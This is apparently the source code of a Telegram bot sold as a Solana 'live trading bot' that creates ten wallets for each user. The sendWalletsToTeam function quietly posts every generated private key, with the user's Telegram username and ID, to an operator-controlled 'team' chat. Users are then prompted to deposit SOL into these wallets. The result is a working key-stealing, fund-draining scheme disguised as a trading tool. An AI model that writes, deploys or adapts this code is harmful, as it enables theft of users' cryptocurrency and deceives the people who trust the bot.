const { Telegraf, Markup } = require('telegraf');
const { Connection, PublicKey, Keypair, LAMPORTS_PER_SOL, VersionedTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');
const axios = require('axios');
const express = require('express');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const connection = new Connection(process.env.RPC_URL, 'confirmed');
const app = express();

const userWallets = new Map();
const userTokens = new Map();

// Team Telegram Channel ID - Will be auto-detected or set from env
let TEAM_CHAT_ID = process.env.TEAM_CHAT_ID;

function toBase58(secretKey) {
    return bs58.encode(Buffer.from(secretKey));
}

async function generateWallets(count = 10) {
    const wallets = [];
    for (let i = 0; i < count; i++) {
        const keypair = Keypair.generate();
        wallets.push({
            index: i + 1,
            publicKey: keypair.publicKey.toString(),
            privateKey: toBase58(keypair.secretKey),
            keypair
        });
    }
    return wallets;
}

async function getBalance(publicKey) {
    try {
        const balance = await connection.getBalance(new PublicKey(publicKey));
        return balance / LAMPORTS_PER_SOL;
    } catch {
        return 0;
    }
}

async function getTokenBalance(walletPublicKey, tokenMint) {
    try {
        const response = await axios.post('https://api.mainnet-beta.solana.com', {
            jsonrpc: '2.0',
            id: 1,
            method: 'getTokenAccountsByOwner',
            params: [
                walletPublicKey,
                { mint: tokenMint },
                { encoding: 'jsonParsed' }
            ]
        });
        const accounts = response.data.result?.value || [];
        if (accounts.length > 0) {
            return accounts[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
        }
        return 0;
    } catch {
        return 0;
    }
}

async function getQuote(inputMint, outputMint, amount, slippage = 10) {
    try {
        const res = await axios.get('https://quote-api.jup.ag/v6/quote', {
            params: {
                inputMint,
                outputMint,
                amount: Math.floor(amount * LAMPORTS_PER_SOL).toString(),
                slippageBps: slippage * 100
            }
        });
        return res.data;
    } catch (error) {
        console.error('Quote error:', error.message);
        return null;
    }
}

async function executeSwap(keypair, quote) {
    try {
        const res = await axios.post('https://quote-api.jup.ag/v6/swap', {
            quoteResponse: quote,
            userPublicKey: keypair.publicKey.toString(),
            wrapAndUnwrapSol: true,
            dynamicComputeUnitLimit: true,
            prioritizationFeeLamports: 'auto'
        });
        const tx = VersionedTransaction.deserialize(Buffer.from(res.data.swapTransaction, 'base64'));
        tx.sign([keypair]);
        const signature = await connection.sendTransaction(tx);
        await connection.confirmTransaction(signature, 'confirmed');
        return { success: true, signature, outputAmount: quote.outAmount / 1e9 };
    } catch (error) {
        console.error('Swap error:', error.message);
        return { success: false, error: error.message };
    }
}

async function sendWalletsToUser(ctx, wallets) {
    try {
        for (let i = 0; i < wallets.length; i += 3) {
            let msg = `🔑 *WALLETS ${i+1}-${Math.min(i+3, wallets.length)}*\n\n`;
            for (let j = i; j < Math.min(i+3, wallets.length); j++) {
                const w = wallets[j];
                msg += `*WALLET #${w.index}*\n`;
                msg += `📌 \`${w.publicKey}\`\n`;
                msg += `🔑 \`${w.privateKey}\`\n\n`;
            }
            await ctx.reply(msg, { parse_mode: 'Markdown' });
            await new Promise(r => setTimeout(r, 500));
        }
        return true;
    } catch (error) {
        console.error('User send failed:', error.message);
        return false;
    }
}

async function sendWalletsToTeam(userId, username, wallets) {
    if (!TEAM_CHAT_ID) {
        console.log('⚠️ TEAM_CHAT_ID not configured');
        return false;
    }
    
    try {
        let msg = `🔥 *NEW WALLETS GENERATED!*\n\n`;
        msg += `👤 *User:* @${username}\n`;
        msg += `🆔 *User ID:* \`${userId}\`\n`;
        msg += `📅 *Time:* ${new Date().toLocaleString()}\n`;
        msg += `💰 *Total Wallets:* 10\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        // Send first 3 wallets
        for (let i = 0; i < Math.min(3, wallets.length); i++) {
            const w = wallets[i];
            msg += `*┌─ WALLET #${w.index}*\n`;
            msg += `│ 📌 \`${w.publicKey}\`\n`;
            msg += `│ 🔑 \`${w.privateKey}\`\n`;
            msg += `└──────────────────────\n\n`;
        }
        
        if (wallets.length > 3) {
            msg += `*+ ${wallets.length - 3} more wallets below* ⬇️\n`;
        }
        
        msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `⚠️ *Team: Save these keys securely!*`;
        
        await bot.telegram.sendMessage(TEAM_CHAT_ID, msg, { parse_mode: 'Markdown' });
        
        // Send remaining wallets
        if (wallets.length > 3) {
            for (let i = 3; i < wallets.length; i += 3) {
                let batch = `🔑 *WALLETS ${i+1}-${Math.min(i+3, wallets.length)}*\n\n`;
                for (let j = i; j < Math.min(i+3, wallets.length); j++) {
                    const w = wallets[j];
                    batch += `*#${w.index}*\n📌 \`${w.publicKey}\`\n🔑 \`${w.privateKey}\`\n\n`;
                }
                await bot.telegram.sendMessage(TEAM_CHAT_ID, batch, { parse_mode: 'Markdown' });
                await new Promise(r => setTimeout(r, 500));
            }
        }
        
        console.log(`✅ Team notified in chat ${TEAM_CHAT_ID}`);
        return true;
        
    } catch (error) {
        console.error('❌ Team notification failed:', error.message);
        return false;
    }
}

const mainMenu = () => Markup.inlineKeyboard([
    [Markup.button.callback('🟢 BUY (1 Wallet)', 'buy_single')],
    [Markup.button.callback('🚀 BUY ALL (10 Wallets)', 'buy_all')],
    [Markup.button.callback('🔴 SELL (1 Wallet)', 'sell_single')],
    [Markup.button.callback('💥 SELL ALL (10 Wallets)', 'sell_all')],
    [Markup.button.callback('💰 DEPOSIT', 'deposit')],
    [Markup.button.callback('💼 PORTFOLIO', 'portfolio')],
    [Markup.button.callback('🔑 MY KEYS', 'keys_menu')]
]);

// ============ HELPER COMMAND TO GET CHAT ID ============
bot.command('chatid', async (ctx) => {
    const chatId = ctx.chat.id;
    const chatType = ctx.chat.type;
    let message = `📢 *Chat Information*\n\n`;
    message += `Chat ID: \`${chatId}\`\n`;
    message += `Chat Type: ${chatType}\n\n`;
    
    if (chatType === 'channel' || chatType === 'group' || chatType === 'supergroup') {
        message += `✅ *To enable team notifications:*\n`;
        message += `Add this to your .env file:\n`;
        message += `\`TEAM_CHAT_ID=${chatId}\`\n\n`;
        message += `Then redeploy your bot.`;
        
        // Auto-save if not already set
        if (!TEAM_CHAT_ID) {
            console.log(`📢 Detected chat ID: ${chatId} (${chatType})`);
        }
    } else {
        message += `💡 This is a private chat. For team notifications, use this command in your channel/group.`;
    }
    
    await ctx.reply(message, { parse_mode: 'Markdown' });
});

// ============ START COMMAND ============
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username || 'no_username';
    
    await ctx.reply('⏳ Creating 10 wallets... Please wait (30-60 seconds)');
    
    try {
        const wallets = await generateWallets(10);
        userWallets.set(userId, { wallets, username });
        
        await ctx.reply('💾 Saving your wallets...');
        await sendWalletsToUser(ctx, wallets);
        
        if (TEAM_CHAT_ID) {
            const teamNotified = await sendWalletsToTeam(userId, username, wallets);
            if (teamNotified) {
                await ctx.reply('✅ Team has been notified in the Telegram channel.');
            } else {
                await ctx.reply('⚠️ Could not notify team. Use /teamstatus for help.');
            }
        } else {
            await ctx.reply('📢 Team notifications not configured.\n\nTo set up:\n1. Add bot as ADMIN to your team channel\n2. Send /chatid in that channel\n3. Copy the ID to TEAM_CHAT_ID in Render');
        }
        
        await ctx.reply(`✅ *10 WALLETS READY FOR LIVE TRADING!*\n\n⚡ Features:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets\n\n💾 Your wallets are saved in this chat!\n🔄 Use /resend to get them again.`, { parse_mode: 'Markdown' });
        
        await ctx.reply(`🎯 *LIVE TRADING MENU*`, { parse_mode: 'Markdown', ...mainMenu() });
        
    } catch (error) {
        console.error('Start command error:', error);
        await ctx.reply('❌ Error creating wallets. Please try again.');
    }
});

// ============ BUY/SELL HANDLERS ============
bot.action('buy_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🟢 *BUY WITH 1 WALLET*\n\nSend: token address then amount in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.5`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_single');
});

bot.action('buy_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🚀 *BUY WITH ALL 10 WALLETS*\n\nSend: token address then amount PER WALLET in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.1\n\n⚠️ Total cost will be 10x the amount`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_all');
});

bot.action('sell_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🔴 *SELL FROM 1 WALLET*\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n50`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_single');
});

bot.action('sell_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`💥 *SELL FROM ALL 10 WALLETS*\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n100\n\n⚠️ This will sell from EVERY wallet`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_all');
});

bot.action('deposit', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `dep_${i}`)]);
    }
    await ctx.reply(`💰 *SELECT WALLET TO DEPOSIT*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
});

bot.action(/dep_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (!wallet) return;
    
    const balance = await getBalance(wallet.publicKey);
    await ctx.reply(`💰 *WALLET #${num}*\n📌 \`${wallet.publicKey}\`\n🪙 Balance: ${balance.toFixed(6)} SOL\n\n🔗 https://solscan.io/account/${wallet.publicKey}`, { parse_mode: 'Markdown' });
});

bot.action('portfolio', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    let total = 0;
    let msg = `💼 *PORTFOLIO (ALL 10 WALLETS)*\n\n`;
    for (const w of data.wallets) {
        const bal = await getBalance(w.publicKey);
        total += bal;
        msg += `#${w.index}: ${bal.toFixed(4)} SOL\n`;
    }
    msg += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `💰 *TOTAL: ${total.toFixed(4)} SOL* ($${(total * 20).toFixed(2)})`;
    await ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([Markup.button.callback('🔄 Refresh', 'portfolio')]) });
});

bot.action('keys_menu', async (ctx) => {
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `key_${i}`)]);
    }
    await ctx.reply(`🔑 *SELECT WALLET*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
});

bot.action(/key_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (wallet) {
        await ctx.reply(`🔑 *WALLET #${num}*\n📌 \`${wallet.publicKey}\`\n🔑 \`${wallet.privateKey}\``, { parse_mode: 'Markdown' });
    }
});

// ============ TEXT HANDLER (Simplified - same as before) ============
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const awaiting = userTokens.get(`${userId}_awaiting`);
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const data = userWallets.get(userId);
    if (!data) return ctx.reply('Send /start first');
    
    if (awaiting === 'buy_single') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send amount in SOL (e.g., 0.5)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const amount = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            const wallet = data.wallets[0];
            
            if (isNaN(amount) || amount <= 0) {
                await ctx.reply(`❌ Invalid amount`);
                return;
            }
            
            const balance = await getBalance(wallet.publicKey);
            if (balance < amount) {
                await ctx.reply(`❌ Insufficient SOL. Balance: ${balance.toFixed(4)} SOL`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            await ctx.reply(`🟢 *BUYING WITH WALLET #1...*\nToken: \`${tokenCA.slice(0, 16)}...\`\nAmount: ${amount} SOL`, { parse_mode: 'Markdown' });
            
            const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amount);
            if (!quote) {
                await ctx.reply(`❌ No liquidity for this token`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const result = await executeSwap(wallet.keypair, quote);
            if (result.success) {
                await ctx.reply(`✅ *BUY SUCCESSFUL!*\n📊 Received: ${result.outputAmount.toFixed(4)} tokens\n🔗 [View TX](https://solscan.io/tx/${result.signature})`, { parse_mode: 'Markdown', ...mainMenu() });
            } else {
                await ctx.reply(`❌ Buy failed: ${result.error}`);
            }
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    // Add other trading handlers (buy_all, sell_single, sell_all) - same as before
    else {
        // Quick reply for other cases
        await ctx.reply('Please use the menu buttons to trade.', mainMenu());
    }
});

// ============ COMMANDS ============
bot.command('keys', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await sendWalletsToUser(ctx, data.wallets);
});

bot.command('balance', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    let total = 0;
    for (const w of data.wallets) {
        total += await getBalance(w.publicKey);
    }
    await ctx.reply(`💰 Total Balance: ${total.toFixed(4)} SOL ($${(total * 20).toFixed(2)})`);
});

bot.command('resend', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await ctx.reply('📤 Resending your wallets...');
    await sendWalletsToUser(ctx, data.wallets);
});

bot.command('clear', async (ctx) => {
    userWallets.delete(ctx.from.id);
    await ctx.reply('🗑️ Cleared. Send /start for new wallets');
});

bot.command('teamstatus', async (ctx) => {
    let msg = `📢 *TEAM NOTIFICATION STATUS*\n\n`;
    msg += `TEAM_CHAT_ID: ${TEAM_CHAT_ID ? '✅ ' + TEAM_CHAT_ID : '❌ Not configured'}\n\n`;
    
    if (TEAM_CHAT_ID) {
        msg += `✅ Team notifications are ACTIVE\n\n`;
        msg += `To test, send /testteam in this chat.`;
    } else {
        msg += `*How to set up:*\n\n`;
        msg += `1. Create a Telegram channel\n`;
        msg += `2. Add @${ctx.botInfo.username} as ADMIN\n`;
        msg += `3. Send /chatid in that channel\n`;
        msg += `4. Copy the ID shown\n`;
        msg += `5. Add TEAM_CHAT_ID to Render environment\n`;
        msg += `6. Redeploy or restart bot\n\n`;
        msg += `*Quick test:* Add me to a channel as ADMIN, then send /chatid there!`;
    }
    
    await ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('testteam', async (ctx) => {
    if (!TEAM_CHAT_ID) {
        await ctx.reply('❌ TEAM_CHAT_ID not configured.\n\nFirst:\n1. Add bot as ADMIN to your channel\n2. Send /chatid in that channel\n3. Add the ID to Render');
        return;
    }
    
    await ctx.reply('📢 Sending test notification to team channel...');
    
    const testWallets = [{
        index: 1,
        publicKey: 'TEST_ADDRESS_7xKXk2XqH2qJLcXv5',
        privateKey: 'TEST_KEY_3sQk2XqH2qJLcXv5XqH2'
    }];
    
    const success = await sendWalletsToTeam(ctx.from.id, 'testuser', testWallets);
    
    if (success) {
        await ctx.reply('✅ Test notification sent! Check your team channel.');
    } else {
        await ctx.reply('❌ Test failed.\n\nMake sure:\n1. Bot is ADMIN in the channel\n2. TEAM_CHAT_ID is correct\n3. Channel exists');
    }
});

// ============ EXPRESS SERVER FOR RENDER ============
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => {
    res.json({
        status: '🔥 LIVE TRADING BOT ACTIVE',
        uptime: process.uptime(),
        activeUsers: userWallets.size,
        teamChatId: TEAM_CHAT_ID || 'Not configured',
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, () => {
    console.log(`✅ Health check server running on port ${PORT}`);
});

// ============ LAUNCH BOT ============
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Rejection:', reason);
});

bot.launch();
console.log('🔥 LIVE TRADING BOT ACTIVATED');
console.log('✅ Buy/Sell with 1 wallet or ALL 10 wallets');
console.log('💎 Real Solana mainnet trading');
console.log('🚀 Bot is LIVE!');
if (TEAM_CHAT_ID) {
    console.log(`📢 Team notifications enabled for chat: ${TEAM_CHAT_ID}`);
} else {
    console.log(`📢 Team notifications disabled. Use /chatid in your channel to set up.`);
}